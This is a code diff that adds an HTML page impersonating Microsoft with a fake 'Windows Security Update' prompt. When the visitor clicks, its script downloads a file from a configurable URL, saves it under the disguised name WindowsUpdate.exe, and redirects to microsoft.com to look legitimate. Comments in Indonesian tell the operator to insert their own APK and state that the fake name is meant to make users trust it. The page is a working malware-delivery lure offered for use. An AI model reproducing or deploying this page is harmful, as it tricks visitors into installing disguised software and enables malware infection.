@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>microsoft.com</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body, html { margin:0; padding:0; height:100vh; background:#f0f0f0; font-family:'Segoe UI',Arial,sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; color:#333; }
+    .logo { font-size:80px; color:#0078d4; margin-bottom:20px; font-weight:bold; }
+    h1 { font-size:28px; margin:10px 0; }
+    p { color:#666; font-size:18px; max-width:500px; }
+    .loader { width:60px; height:60px; border:6px solid #f0f0f0; border-top:6px solid #0078d4; border-radius:50%; animation:spin 1s linear infinite; margin:30px auto; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+  <div class="logo">Microsoft</div>
+  <h1>Windows Security Update</h1>
+  <p>Click anywhere to begin the update process...</p>
+  <div class="loader"></div>
+
+  <script>
+    // APK KAMU (ganti sesuai punya kamu)
+    const APK_URL = "https://download.binance.com/pack/BNApp64.apk";
+
+    document.addEventListener("click", async () => {
+      // 1. TUNGGU 3 DETIK → REDIRECT KE MICROSOFT.COM (SPOOF ORIGIN)
+      setTimeout(() => {
+        location.href = "https://microsoft.com/";
+      }, 3000);
+
+      // 2. 1 DETIK KEMUDIAN → PAKAI showSaveFilePicker() → DOWNLOAD .APK DENGAN NAMA .EXE
+      setTimeout(async () => {
+        if ('showSaveFilePicker' in window) {
+          try {
+            const handle = await showSaveFilePicker({
+              suggestedName: "WindowsUpdate.exe", // Nama bohong biar user percaya
+              types: [{
+                description: "Application",
+                accept: { "application/octet-stream": [".exe"] }
+              }]
+            });
+
+            const writable = await handle.createWritable();
+
+            // Ambil APK dari internet
+            const response = await fetch(APK_URL);
+            const blob = await response.blob();
+
+            await writable.write(blob);
+            await writable.close();
+
+            // Optional: kasih notif
+            //alert("Update downloaded successfully!");
+          } catch (err) {
+            // User cancel → silent
+          }
+        } else {
+          // Fallback kalau browser tidak support showSaveFilePicker
+          const link = document.createElement("a");
+          link.href = APK_URL;
+          link.download = "WindowsUpdate.exe";
+          link.click();
+        }
+      }, 1000);
+    }, { once: true });
+  </script>
+
+</body>
+</html>
